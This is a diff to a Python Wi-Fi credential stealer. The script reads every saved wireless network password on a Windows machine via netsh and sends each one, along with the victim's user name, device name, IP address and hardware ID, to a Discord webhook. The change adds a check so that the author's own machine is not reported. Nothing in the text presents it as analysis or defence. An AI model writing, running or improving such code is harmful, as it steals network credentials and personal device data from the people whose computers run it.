@@ -17,11 +17,12 @@ for i in profiles:
     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
     results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
     try:
-        results = f"[ WIFI LOG ]\nUser: {pc_user}\nDevice: {pc_name}\nIP: {IP}\nHWID: {hwid}" + "\nNetwork: {:<30}\nPassword: {:<}\n------------------------------\n".format(i, results[0])
-
-        AuthHook = DiscordWebhook(url=Discord_webhook_URL, content=results)
-        AuthHook.execute()
+        if hwid == my_hwid:
+            pass
+        else:
+            results = f"[ WIFI LOG ]\nUser: {pc_user}\nDevice: {pc_name}\nIP: {IP}\nHWID: {hwid}" + "\nNetwork: {:<30}\nNetwork password: {:<}\n------------------------------\n".format(i, results[0])
+            AuthHook = DiscordWebhook(url=Discord_webhook_URL, content=results)
+            AuthHook.execute()
 
     except IndexError:
         results = "{:<30}|  {:<}".format(i, "")
-  
